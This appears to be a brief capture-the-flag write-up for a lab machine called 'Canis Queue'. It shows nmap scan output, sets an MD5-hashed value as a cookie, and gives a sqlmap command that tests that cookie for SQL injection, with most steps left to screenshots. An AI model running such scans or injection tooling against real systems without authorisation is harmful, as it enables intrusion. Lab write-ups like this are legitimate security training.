<!-- 5/100 -->

# NMAP

```bash
PORT   STATE SERVICE REASON         VERSION

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDrxDlZxvJUZk2qXaeBdjHxfM3MSGpZ8H6zPqgarnP3K806zE1Y/CryyT4wgIZYomtV8wUWHlFkuqbWjcKcM1MWcPjzGWfPZ2wHTNgUkHvBWZ+fxoX8vJoC6wfpifa7bSMaOItFWSLnMGOXigHbF6dPNyP+/kXAJE+tg9TurrTKaPiL6u+02ITeVUuLWsjwlLDJAnu1zDhPONR2b7WTcU/zQxHUYZiHpHn5eBtXpCZPZyfOZ+828ibobM/CAHIBZqJsYksAe5RbtDw7Vdw/8OtYuo4Koz8C2kBoWCHvsmyDfwZ57E2Ycss4JG5j7fMt7sI+lh/NHE+/7zrXdH/4njCD
|   256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMlni4gM6dVkvfGeMy6eg/18HsCYvvFhbpycXiGYM3fitNhTXW4WpMpr8W/0y2FszEB6TGD93ib/lCTsBOQG5Uw=
|   256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICQIHukp5WpajvhF4juRWmL2+YtbN9HbhgLScgqYNien

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Canis Queue
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumeration

![image](https://user-images.githubusercontent.com/68326057/120881117-83da2f00-c5ec-11eb-83b8-3a36accb5db1.png)


![image](https://user-images.githubusercontent.com/68326057/120881153-dae00400-c5ec-11eb-876c-5b0e8e40790c.png)

```bash
 echo "69" | md5sum                   
105be3ebd0677ec739afd851a6d87fd5 
```

I put this value in cookie

![image](https://user-images.githubusercontent.com/68326057/120881166-f64b0f00-c5ec-11eb-8ad7-cce5712d0796.png)

![image](https://user-images.githubusercontent.com/68326057/120881281-8b4e0800-c5ed-11eb-8ce2-bfbe40fce0a9.png)

--> https://superuser.com/questions/747551/how-do-i-check-for-sql-injection-in-cookie

```bash
sqlmap --cookie="id=705e3461bba168a8e922ecff55333463" -u "http://10.10.88.196/index.php" -p "id" --level 3 --dbms=MYSQL
```

![image](https://user-images.githubusercontent.com/68326057/120881781-34e2c880-c5f1-11eb-993b-2821c69ea476.png)


